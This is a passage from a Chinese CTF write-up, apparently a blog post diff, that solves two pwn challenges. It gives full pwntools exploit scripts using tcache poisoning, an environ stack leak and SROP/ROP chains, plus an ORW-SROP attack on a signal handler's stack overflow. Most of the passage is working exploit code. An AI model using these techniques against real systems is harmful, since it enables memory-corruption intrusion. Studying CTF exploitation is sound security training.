= environ + <span class="number">0x800</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">io.send(<span class="built_in">bytes</span>(frame) + <span class="string">b&quot;Nepnep\n&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>最终利用 SROP 执行 write(6, “Nepnep”, 6);</p>
+<h3 id="总-EXP：-1"><a href="#总-EXP：-1" class="headerlink" title="总 EXP："></a>总 EXP：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;info&quot;</span></span><br><span class="line"></span><br><span class="line">BIN = args.BIN <span class="keyword">or</span> <span class="string">&quot;./pwn_patched&quot;</span></span><br><span class="line">elf = ELF(BIN, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">return</span> process([elf.path])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">io, idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;idx: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;done\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">io, idx, data</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;idx: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;input: &quot;</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">io, idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;idx: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;done\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">io, idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;idx: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(io.recvline().strip(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poke</span>(<span class="params">io, idx, value</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;5&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;idx: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;qword: &quot;</span>, <span class="built_in">str</span>(value).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;done\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">gift = <span class="built_in">int</span>(io.recvline_contains(<span class="string">b&quot;gift&quot;</span>).split()[-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">libc.address = gift - libc.sym[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc base = %#x&quot;</span>, libc.address)</span><br><span class="line"></span><br><span class="line">add(io, <span class="number">0</span>)</span><br><span class="line">delete(io, <span class="number">0</span>)</span><br><span class="line">poke(io, <span class="number">0</span>, libc.sym[<span class="string">&quot;environ&quot;</span>])</span><br><span class="line"></span><br><span class="line">add(io, <span class="number">1</span>)</span><br><span class="line">add(io, <span class="number">2</span>)</span><br><span class="line">add(io, <span class="number">3</span>)</span><br><span class="line">environ = show(io, <span class="number">3</span>)</span><br><span class="line">log.success(<span class="string">f&quot;environ is -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(environ)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = environ - <span class="number">0x1e0</span></span><br><span class="line">log.success(<span class="string">f&quot;environ = <span class="subst">&#123;<span class="built_in">hex</span>(environ)&#125;</span> (stack_addr=<span class="subst">&#123;<span class="built_in">hex</span>(stack_addr)&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(io, <span class="number">3</span>)</span><br><span class="line">poke(io, <span class="number">3</span>, stack_addr)</span><br><span class="line">add(io, <span class="number">4</span>)  <span class="comment"># slot[4].ptr = envp</span></span><br><span class="line">add(io, <span class="number">5</span>)  <span class="comment"># slot[5].ptr = stack_addr</span></span><br><span class="line"></span><br><span class="line">pop_rsp = libc.address + <span class="number">0x3C068</span></span><br><span class="line">pop_rdi = libc.address + <span class="number">0x10F78B</span></span><br><span class="line">pop_rax = libc.address + <span class="number">0xDD237</span></span><br><span class="line">syscall = libc.address + <span class="number">0x98FB6</span></span><br><span class="line">gets = libc.sym[<span class="string">&quot;gets&quot;</span>]</span><br><span class="line"></span><br><span class="line">frame_addr = environ + <span class="number">0x30</span></span><br><span class="line">marker_addr = frame_addr + <span class="built_in">len</span>(<span class="built_in">bytes</span>(SigreturnFrame()))</span><br><span class="line"></span><br><span class="line">payload2 = flat(</span><br><span class="line">    pop_rdi,</span><br><span class="line">    frame_addr,</span><br><span class="line">    gets,</span><br><span class="line">    pop_rax,</span><br><span class="line">    constants.SYS_rt_sigreturn,</span><br><span class="line">    syscall,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">payload1 = flat(</span><br><span class="line">    pop_rsp,</span><br><span class="line">    environ,</span><br><span class="line">).ljust(<span class="number">0x30</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_write</span><br><span class="line">frame.rdi = <span class="number">6</span></span><br><span class="line">frame.rsi = marker_addr</span><br><span class="line">frame.rdx = <span class="number">6</span></span><br><span class="line">frame.rsp = environ + <span class="number">0x800</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">edit(io, <span class="number">4</span>, payload2)</span><br><span class="line">edit(io, <span class="number">5</span>, payload1)</span><br><span class="line"></span><br><span class="line">io.send(<span class="built_in">bytes</span>(frame) + <span class="string">b&quot;Nepnep\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(io.recvall(timeout=<span class="number">3</span>).decode(errors=<span class="string">&quot;replace&quot;</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784536511674-539e6e85-811c-411b-9de8-5a7cf7043711.png"></p>
+<p>直接打本地了</p>
+<h4 id="另一种解法："><a href="#另一种解法：" class="headerlink" title="另一种解法："></a>另一种解法：</h4><p>朋友用 ai 开出来的一种解法：修了一下大概是这个样子：</p>
+<p>总体思路没有变化，只是在打 ORW 的 write 的时候寻找到了一个 write：用这个一次就写成了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784536661128-dc07df75-132c-4562-a012-14fea0c3bb12.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;info&quot;</span></span><br><span class="line"></span><br><span class="line">BIN = args.BIN <span class="keyword">or</span> <span class="string">&quot;./pwn_patched&quot;</span></span><br><span class="line">elf = ELF(BIN, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    io = process([elf.path])</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdb.attach(io)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">io, idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;idx: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;done\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">io, idx, data</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;idx: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;input: &quot;</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">io, idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;idx: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;done\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">io, idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;idx: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(io.recvline().strip(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poke</span>(<span class="params">io, idx, value</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;5&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;idx: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;qword: &quot;</span>, <span class="built_in">str</span>(value).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;done\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> elf.path.endswith(<span class="string">&quot;pwn_patched&quot;</span>) <span class="keyword">and</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;/priv/flag.txt&quot;</span>):</span><br><span class="line">        log.warning(<span class="string">&quot;local /priv/flag.txt is missing; exploit can run, but parent may have no flag to print&quot;</span>)</span><br><span class="line"></span><br><span class="line">    io = start()</span><br><span class="line"></span><br><span class="line">    gift = <span class="built_in">int</span>(io.recvline_contains(<span class="string">b&quot;gift&quot;</span>).split()[-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">    log.success(<span class="string">f&#x27;gift is <span class="subst">&#123;<span class="built_in">hex</span>(gift)&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(io)</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    libc.address = gift - libc.sym[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">    log.success(<span class="string">&quot;libc base = %#x&quot;</span>, libc.address)</span><br><span class="line"></span><br><span class="line">    add(io, <span class="number">0</span>)</span><br><span class="line">    delete(io, <span class="number">0</span>)</span><br><span class="line">    poke(io, <span class="number">0</span>, libc.sym[<span class="string">&quot;environ&quot;</span>])</span><br><span class="line"></span><br><span class="line">    add(io, <span class="number">1</span>)</span><br><span class="line">    add(io, <span class="number">2</span>)</span><br><span class="line">    add(io, <span class="number">3</span>)</span><br><span class="line">    environ = show(io, <span class="number">3</span>)</span><br><span class="line">    log.info(<span class="string">&quot;environ is = %#x&quot;</span>, environ)</span><br><span class="line"></span><br><span class="line">    stack_addr = environ - <span class="number">0x250</span></span><br><span class="line">    log.success(<span class="string">f&#x27;stack_addr is <span class="subst">&#123;stack_addr&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete(io, <span class="number">3</span>)</span><br><span class="line">    poke(io, <span class="number">3</span>, stack_addr)</span><br><span class="line">    add(io, <span class="number">4</span>)</span><br><span class="line">    add(io, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    pop_rdi = libc.address + <span class="number">0x10F78B</span></span><br><span class="line">    pop_rbx = libc.address + <span class="number">0x586E4</span></span><br><span class="line">    write_gadget = libc.address + <span class="number">0x8FAF4</span></span><br><span class="line">    nepnep = stack_addr + <span class="number">5</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    payload = flat(</span><br><span class="line">        pop_rdi,</span><br><span class="line">        <span class="number">6</span>, </span><br><span class="line">        pop_rbx,</span><br><span class="line">        nepnep,</span><br><span class="line">        write_gadget,</span><br><span class="line">        <span class="string">b&quot;Nepnep\x00\x00&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(payload) == <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">    edit(io, <span class="number">5</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.INTERACTIVE:</span><br><span class="line">        io.interactive()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(io.recvall(timeout=<span class="number">3</span>).decode(errors=<span class="string">&quot;replace&quot;</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="shadow-signal"><a href="#shadow-signal" class="headerlink" title="shadow_signal"></a>shadow_signal</h2><p>这道题目的利用手法主要是 ORW-SROP，记得有和这个很像的一道题目：[ NewStarCTF 2025 ]only_read</p>
+<p>之前做过笔记，因此很快就想到了这样的利用手法，利用 syscall 调用 ORW</p>
+<h3 id="解题记录：-2"><a href="#解题记录：-2" class="headerlink" title="解题记录："></a>解题记录：</h3><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784452237433-3b00b0f1-dafb-4023-b6aa-4cead62738ad.png"></p>
+<p>这道题开始写的时候已经一百多解了，主要是最近也比较忙，忙着去同学家玩哈哈，抽空来写一写，以至于写完这场比赛已经快结束了。现在依旧在同学家 emmm 还要写 wp 呃呃，现在已经是 20 号下午五点了，js 那个题目可能是没时间去写 wp 了，毕竟八点就要交 wp 了，之后写一写统一发布到博客上吧再 0.O、、</p>
+<h3 id="解题思路：-1"><a href="#解题思路：-1" class="headerlink" title="解题思路："></a>解题思路：</h3><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784538140829-80cd79f7-6224-4b50-b15b-a1e6c2f8c4ee.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784538271808-5b2c1377-6a97-4abf-9416-c8458894074c.png"></p>
+<p>glibc 给到 2.35 版本，还是先从 IDA 静态分析</p>
+<h4 id="IDA-静态分析：-2"><a href="#IDA-静态分析：-2" class="headerlink" title="IDA 静态分析："></a>IDA 静态分析：</h4><h5 id="main："><a href="#main：" class="headerlink" title="main："></a>main：</h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784538424755-24e3fb78-1f93-4156-b2d5-2e520ec040d0.png"></p>
+<p>非常简短的 main 函数，另外开启了沙箱，也就是说依旧要打 ORW，前面连着已经一直在打 ORW 了呃呃</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784538633434-0587e5bf-5a80-4e23-ab25-6dd18e5506cf.png"></p>
+<p>我们从 main 函数中可以看到一开始给了个 printf 去打印 stdout，运行一下程序看看是怎么个事儿：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784538686716-a25598d1-edb3-4ba6-afa9-b9365abf8c4f.png"></p>
+<p>意思是说直接给了 stdout 地址吗？那很可以了，直接给 libc 基地址了，不放心的话可以动态调试一下看看</p>
+<p>之后 <code>puts(buf);</code>，假设传入 1 等非法地址，就会触发 SIGSEGV 进入到 handler</p>
+<h5 id="init："><a href="#init：" class="headerlink" title="init："></a>init：</h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784539834291-760fd3ce-38d8-44a9-9be0-7b3caf14a269.png"></p>
+<p>这里解释一下为什么会触发 SIGSEGV 进入到 handler：</p>
+<p>在 init 当中注册了 handler，因此 SIGSEGV 不会直接崩溃退出，而是进入 handler()。</p>
+<h5 id="handler："><a href="#handler：" class="headerlink" title="handler："></a>handler：</h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784539260593-e6e895a5-d53f-44c8-80f4-4ef771ed6fc9.png"></p>
+<p>handler 有一个很明显的栈溢出，不过需要注意的一点是：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( retaddr != (<span class="type">void</span> *)shadow_saved_rip )</span><br><span class="line">&#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;shadow stack broken\n&quot;</span>, <span class="number">0x14u</span>);</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>不能修改返回地址，但这里是 signal handler，Linux 调用 signal handler 时，handler 原本的返回地址就是 libc 里的 __restore_rt，我们不动返回地址即可</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -Ws ./libc.so.<span class="number">6</span> | grep __restore_rt</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784540464241-236893ec-0754-4a8a-bdee-521ba9e371c7.png"></p>
+<h3 id="EXP-思路：-1"><a href="#EXP-思路：-1" class="headerlink" title="EXP 思路："></a>EXP 思路：</h3><h5 id="泄露-libc"><a href="#泄露-libc" class="headerlink" title="泄露 libc"></a>泄露 libc</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gift = <span class="built_in">int</span>(io.recvline_contains(<span class="string">b&quot;gift&quot;</span>).split()[-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">libc.address = gift - libc.sym[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc base = %#x&quot;</span>, libc.address)</span><br></pre></td></tr></table></figure>
+
+<h5 id="第一次-SROP"><a href="#第一次-SROP" class="headerlink" title="第一次 SROP"></a>第一次 SROP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_frame</span>(<span class="params">rax, rdi, rsi, rdx, rsp, rip</span>):</span><br><span class="line">    frame = SigreturnFrame()</span><br><span class="line">    frame.rax = rax</span><br><span class="line">    frame.rdi = rdi</span><br><span class="line">    frame.rsi = rsi</span><br><span class="line">    frame.rdx = rdx</span><br><span class="line">    frame.rsp = rsp</span><br><span class="line">    frame.rip = rip</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line">stage = bss + <span class="number">0x800</span></span><br><span class="line">syscall = libc.address + <span class="number">0x91316</span></span><br><span class="line">restore_rt = libc.address + <span class="number">0x42520</span></span><br><span class="line"></span><br><span class="line">payload2 = flat(</span><br><span class="line">    <span class="string">b&quot;a&quot;</span> * <span class="number">0x110</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    restore_rt,</span><br><span class="line">    make_frame(constants.SYS_read, <span class="number">0</span>, stage, <span class="number">0x600</span>, stage, syscall),</span><br><span class="line">).ljust(<span class="number">0x500</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784540464241-236893ec-0754-4a8a-bdee-521ba9e371c7.png"></p>
+<p>执行 read(0, stage, 0x600)，把 payload3 读到 .bss</p>
+<h5 id="ORWSROP："><a href="#ORWSROP：" class="headerlink" title="ORWSROP："></a>ORWSROP：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">payload3 = flat(&#123;</span><br><span class="line">        <span class="number">0x000</span>: flat(</span><br><span class="line">            pop_rax,</span><br><span class="line">            constants.SYS_rt_sigreturn,</span><br><span class="line">            syscall,</span><br><span class="line">            make_frame(constants.SYS_open, path, <span class="number">0</span>, <span class="number">0</span>, read_chain, syscall),</span><br><span class="line">        ),</span><br><span class="line">        <span class="number">0x180</span>: flat(</span><br><span class="line">            pop_rax,</span><br><span class="line">            constants.SYS_rt_sigreturn,</span><br><span class="line">            syscall,</span><br><span class="line">            make_frame(constants.SYS_read, <span class="number">3</span>, buf, <span class="number">0x200</span>, write_chain, syscall),</span><br><span class="line">        ),</span><br><span class="line">        <span class="number">0x300</span>: flat(</span><br><span class="line">            pop_rax,</span><br><span class="line">            constants.SYS_rt_sigreturn,</span><br><span class="line">            syscall,</span><br><span class="line">            make_frame(constants.SYS_write, <span class="number">1</span>, buf, <span class="number">0x200</span>, stage + <span class="number">0x580</span>, syscall),</span><br><span class="line">        ),</span><br><span class="line">        <span class="number">0x480</span>: FLAG + <span class="string">b&quot;\x00&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    length=<span class="number">0x600</span>,</span><br><span class="line">    filler=<span class="string">b&quot;a&quot;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>最后一步就是利用 SROP 去分别调用 open，read，write，简单分析一个，然后剩下的就举一反三吧：</p>
